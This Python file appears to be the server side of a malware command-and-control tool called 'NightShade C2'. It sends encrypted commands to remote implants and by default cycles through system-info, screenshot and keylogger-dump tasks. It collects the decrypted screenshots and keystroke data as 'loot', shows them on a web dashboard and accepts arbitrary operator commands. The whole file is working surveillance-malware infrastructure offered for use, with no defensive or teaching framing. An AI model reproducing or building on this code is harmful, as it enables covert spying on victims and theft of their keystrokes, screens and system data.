from flask import Flask, request, render_template_string
from cryptography.fernet import Fernet
import threading, time, os

app = Flask(__name__)

with open("key.vault", "rb") as f:
    cipher = Fernet(f.read())

current_cmd = "sysinfo"
LOOT_DIR = "static/loot"
if not os.path.exists(LOOT_DIR): os.makedirs(LOOT_DIR)

session_logs = []

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NightShade Dashboard</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; padding: 40px; }
        .container { max-width: 1000px; margin: auto; border: 1px solid #30363d; border-radius: 8px; padding: 20px; background: #161b22; }
        h1 { color: #238636; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #30363d; }
        img { width: 150px; border-radius: 4px; border: 1px solid #58a6ff; transition: 0.3s; }
        img:hover { width: 400px; } /* Dynamic zoom for screenshots */
    </style>
</head>
<body>
    <div class="container">
        <h1>NightShade C2</h1>
        <table>
            <tr><th>Timestamp</th><th>Type</th><th>Content</th></tr>
            {% for log in logs %}
            <tr>
                <td>{{ log.time }}</td>
                <td>{{ log.type }}</td>
                <td>
                    {% if log.type == 'Screenshot' %}
                        <img src="/{{ log.data }}">
                    {% else %}
                        <pre style="color: #c9d1d9;">{{ log.data }}</pre>
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML, logs=session_logs)

AUTO_LOOP = ["sysinfo", "screengrab", "keylog_dump"]
loop_index = 0

@app.route('/get_command', methods=['GET'])
def send_cmd():
    global current_cmd, loop_index
    
    if current_cmd == "whoami":
        cmd_to_send = AUTO_LOOP[loop_index]
        loop_index = (loop_index + 1) % len(AUTO_LOOP) 
    else:
        cmd_to_send = current_cmd
        current_cmd = "whoami" 
    
    return cipher.encrypt(cmd_to_send.encode())

@app.route('/post_result', methods=['POST'])
def receive_res():
    try:
        enc_data = request.form.get('result')
        decrypted_bytes = cipher.decrypt(enc_data.encode())
        timestamp = time.strftime('%H:%M:%S')
        
        if decrypted_bytes.startswith(b'\x89PNG'):
            filename = f"{LOOT_DIR}/screenshot_{int(time.time())}.png"
            with open(filename, "wb") as f:
                f.write(decrypted_bytes)
            session_logs.insert(0, {"time": timestamp, "type": "Screenshot", "data": filename})
        else:
            text_data = decrypted_bytes.decode(errors='replace')
            session_logs.insert(0, {"time": timestamp, "type": "System Info", "data": text_data})
            
        return "OK"
    except Exception as e:
        return "Error", 500

def cli():
    global current_cmd
    while True:
        val = input("Enter command: ")
        if val: current_cmd = val

if __name__ == "__main__":
    threading.Thread(target=cli, daemon=True).start()
    app.run(port=5000)